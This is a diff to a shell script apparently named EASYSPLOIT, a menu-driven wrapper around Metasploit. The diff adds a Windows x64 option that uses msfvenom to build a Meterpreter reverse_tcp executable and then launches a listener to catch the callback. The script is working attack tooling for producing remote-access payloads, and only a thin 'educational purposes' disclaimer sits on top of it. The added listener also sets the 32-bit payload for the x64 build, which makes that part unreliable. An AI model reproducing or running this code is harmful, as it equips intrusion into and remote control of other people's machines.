@@ -35,6 +35,7 @@ echo -e '
  EASYSPLOIT is intented ONLY FOR EDUCATIONAL PURPOSES!!! STAY LEGAL!!!
 \e[1;32m
 (1) Windows --> test.exe (payload and listener) 
+(1x) Windows x64 --> test.exe (payload and listener) 
 (2) Android --> test.apk (payload and listener)  
 (3) Linux --> test.py (payload and listener) 
 (4) MacOS --> test.jar (payload and listener)
@@ -51,6 +52,7 @@ echo -e '
 #service postgresql start
 #msfdb start
 exe='1'
+win64='1x'
 apk='2'
 py='3'
 jar='4' 
@@ -81,6 +83,20 @@ Waiting for listener...
 
 msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport $port ; exploit ;"
 
+elif [ "$x" == "$win64" ]; then   
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$ip lport=$port -f exe > ~/Downloads/test_x64.exe
+echo -e '
+
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+!Your payload: ~/Downloads/test_x64.exe!
+!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+Waiting for listener...
+ 
+'
+
+msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport $port ; exploit ;"
 
 elif [ "$x" == "$apk" ]; then                          #APK
 msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port > ~/Downloads/test.apk
